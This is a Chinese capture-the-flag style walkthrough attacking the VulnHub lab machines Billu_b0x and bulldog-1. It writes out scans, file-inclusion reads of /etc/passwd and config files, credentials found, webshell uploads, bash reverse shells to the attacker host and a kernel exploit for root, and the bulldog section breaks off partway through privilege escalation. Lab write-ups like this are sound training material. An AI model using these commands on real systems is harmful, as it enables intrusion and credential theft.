### 运行环境
#### 靶机
- 使用VMWare打开虚拟机，网络连接方式设置为NAT模式，靶机自动获取IP地址。
- IP地址：192.168.64.161

#### 攻击机
- 同一网段下有一台Windows攻击机，安装了以下渗透测试工具：
  - Nmap
  - Burp Suite
  - Sqlmap
  - Netcat (nc)
  - Python 2.7
  - DirBuster
  - Acunetix Web Vulnerability Scanner (AWVS)
  - Nessus
- 另外还有一台Kali Linux攻击机，但主要使用Windows攻击机完成实验。

### 信息收集
#### IP发现
- 启动Billu_b0x虚拟机后，由于虚机网络设置为NAT模式，可以使用Nmap扫描VMware Network Adapter VMnet8网卡的NAT网段C段IP来找到虚机IP。
- 命令：
  ```sh
  nmap -sP 192.168.64.1/24
  ```
- 发现靶机IP地址：192.168.64.161

#### 端口和服务识别
- 使用Nmap扫描1-65535全端口，并进行服务识别和深度扫描（加-A参数），并将结果保存到txt文件。
- 命令：
  ```sh
  nmap -p1-65535 -A 192.168.64.161 -oN billu.txt
  ```
- 扫描结果如下：
  - TCP 22: SSH (OpenSSH 5.9p1)
  - TCP 80: HTTP (Apache httpd 2.2.22)

### 漏洞挖掘
#### 漏洞挖掘思路
1. **SQL注入**：首页提示存在注入点，尝试注入成功。
2. **目录暴破**：使用DirBuster进行目录暴破，寻找新的网页和潜在漏洞。
3. **漏洞扫描**：对暴破出的新网页使用AWVS或APPScan进行漏洞扫描。
4. **手动挖掘**：通过Burp Suite代理浏览器请求，观察Request和Response包，手动查找漏洞。
5. **源码审计**：查看每个网页的源码，寻找提示信息。
6. **登录尝试**：如果获得用户名和密码，尝试登录SSH。

#### 步骤1：测试首页SQL注入
- 在用户名输入框中输入 `admin' or 'a'='a --` 并随意输入密码，发现无法注入，出现JS弹框“Try again”。
- 使用Sqlmap进行POST注入测试：
  ```sh
  sqlmap.py -u "http://192.168.64.161" --data "un=admin&ps=admin&login=let%27s+login" --level 3 --dbms mysql
  ```
- 结果显示无法注入，尝试几个sqlmap的tamper脚本也未成功。暂时放弃注入测试，进行目录暴破。

#### 步骤2：目录暴破
- 使用DirBuster和Kali Linux中的dirb进行目录暴破，以获得更多结果并减少时间。
- 发现多个页面和目录：
  - 页面：test.php, add.php, in.php, c.php, index.php, show.php
  - 目录：uploaded_images, phpmy

#### 步骤3：利用文件包含漏洞获取PHP源码和passwd文件
- 访问test.php，页面提示需要提供file参数。
- 测试文件包含：
  ```sh
  http://192.168.64.161?file=/etc/passwd
  ```
- 发现无法包含，跳转回首页。
- 将GET请求变更为POST请求，文件包含成功，获得passwd文件。
- 使用相同方法下载其他PHP文件并审计源代码。

#### 步骤4：访问add.php、in.php页面和审计代码
- add.php是一个上传界面，但功能无法使用，源码只是一个静态页面。
- in.php是PHP info信息页。

#### 步骤5：查看c.php源码
- c.php是数据库连接文件，发现MySQL连接信息：
  - 用户名：billu
  - 密码：b0x_billu
  - 数据库名：ica_lab

#### 步骤6：通过得到的MySQL密码登录phpMyAdmin
- 通过dirb暴破出/phpmy目录，访问该目录到phpMyAdmin登录页面。
- 使用MySQL密码尝试登录phpMyAdmin失败。
- 推测虚拟机故障，mysql没有正常启动，稍后打算单用户模式进入Ubuntu排查。

#### 步骤7：继续暴破phpmy目录，文件包含phpMyAdmin配置文件
- phpMyAdmin默认配置文件是config.inc.php，猜测路径在/var/www/phpmy下面。
- 通过文件包含读取config.inc.php文件，发现root密码：roottoor。

#### 步骤8：使用Xshell SSH登录root账号
- 使用root账号和密码登录SSH，完成实验。

#### 步骤9：排查MySQL故障
- 获得root权限后，检查MySQL状态为stop/waiting，推测MySQL被之前的高线程目录暴破和扫描导致故障。
- 重启MySQL失败，决定重新安装虚拟机。
- 重新安装后，SSH登录，查看MySQL运行状态正常，新虚机IP变为192.168.64.162。

#### 步骤10：回到步骤6，通过得到的MySQL密码登录phpMyAdmin
- 使用用户名billu和密码b0x_billu登录phpMyAdmin成功。
- 在ica_lab数据库的auth表中，找到web登录的用户名biLLu和密码hEx_it。

### 获取Shell
#### 步骤11：登录index首页并获得cmd shell和反弹shell
- 使用web密码登录首页，登录后是账号管理界面。
- 查看之前暴破出来的图片地址：http://192.168.64.162/uploaded_images/
- 利用图片上传和文件包含漏洞获取shell。
- 下载一张图片jack.php，修改文件内容加入一句话命令马，上传成功。
- 使用Burp执行命令：
  ```sh
  POST /panel.php?cmd=cat%20/etc/passwd;ls
  ```
- 成功执行命令 `cat /etc/passwd;ls`
- 使用bash反弹shell：
  ```sh
  echo "bash -i >& /dev/tcp/192.168.64.1/4444 0>&1" | bash
  ```

#### 步骤12：写入菜刀马
- 文件上传目录uploaded_images为写权限目录，写一个菜刀马：
  ```sh
  echo '' >> caidao.php
  ```
- 菜刀连接成功，方便传文件。

### 提升权限
#### 步骤13：查看内核和系统版本，寻找提权exp
- 查看系统内核版本：
  ```sh
  uname -a
  cat /etc/issue
  ```
- 下载Ubuntu本地提权漏洞exp：
  ```sh
  https://www.exploit-db.com/exploits/37292/
  ```

#### 步骤14：编译和提权
- 赋予执行权限：
  ```sh
  chmod 777 37292.c
  ```
- 编译exp：
  ```sh
  gcc 37292.c -o exp
  ```
- 执行exp，提权至root。

### 思路总结
- 其他渗透思路包括构造注入、暴破phpMyAdmin、文件包含配置文件等。
- 踩到的坑包括MySQL宕机、文件包含漏洞利用、SQL注入花费时间较长等。

### 第三节 bulldog-1
#### 靶机信息
- 下载链接：https://download.vulnhub.com/bulldog/bulldog.ova
- 靶机说明：牛头犬行业网站被恶意黑客破坏，目标是进入root目录并看到祝贺消息。
- 目标：获得root权限和flag。

#### 运行环境
- 靶机：用VirtualBox启动虚机，导入镜像，网络连接方式设置为桥接到无线网卡。靶机IP：172.20.10.7。
- Windows攻击机：物理机，连接无线网卡，IP：172.20.10.5，安装有Burp Suite、nc、Python 2.7、DirBuster等渗透工具。
- Kali攻击机：VMWare启动虚机，桥接到无线网卡，IP：172.20.10.6。

#### 信息收集
- 靶机启动后自动获得IP：172.20.10.7。
- 使用nmap扫描全端口并做服务指纹识别：
  ```sh
  nmap -p1-65535 -A 172.20.10.7 -oN bulldog.txt
  ```
- 发现端口和服务：
  - TCP 23: SSH (open-ssl 7.2p2)
  - TCP 80: HTTP (WSGIServer Python 2.7.12)
  - TCP 8080: HTTP (WSGIServer Python 2.7.12)
- 操作系统：Linux 3.2-4.9

#### 漏洞挖掘
- 查看每个网页的源码，寻找提示。
- 使用DirBuster暴破目录，发现dev和admin目录。
- 访问admin目录，这是一个Django管理后台，需要用户名和密码登录。
- 访问dev目录，发现有价值信息：
  - 新系统使用Django框架开发，不使用PHP或任何CMS。
  - 系统使用webshell管理，有一个Web-shell链接，需要认证。

#### 步骤1：破解Hash
- 查看dev页面源码，发现每个Team Lead的邮箱和hash。
- hash长度为40位，是SHA1。
- 解密出两个hash值：
  - Back End: nick, 密码：bulldog
  - Database: sarah, 密码：bulldoglover

#### 步骤2：登录后台
- 使用解密出的密码尝试登录SSH失败。
- 使用sarah和密码bulldoglover成功登录管理后台，发现没有编辑权限。
- 访问webshell页面，已通过认证，可执行命令。

#### 获取Shell
- 绕过白名单限制，执行系统命令：
  ```sh
  ls && id
  ```
- 反弹shell：
  ```sh
  echo "bash -i >& /dev/tcp/172.20.10.5/4444 0>&1" | bash
  ```

#### 提升权限
- 查看系统用户：
  ```sh
  cat /etc/passwd
  ```
- 发现值得关注的用户：bulldogadmin、django
- 查找每个用户的文件：
  ```sh
  find / -user bulldogadmin 2>/dev/null
  ```
- 发现note文本文件，提示webserver有时需要root权限访问。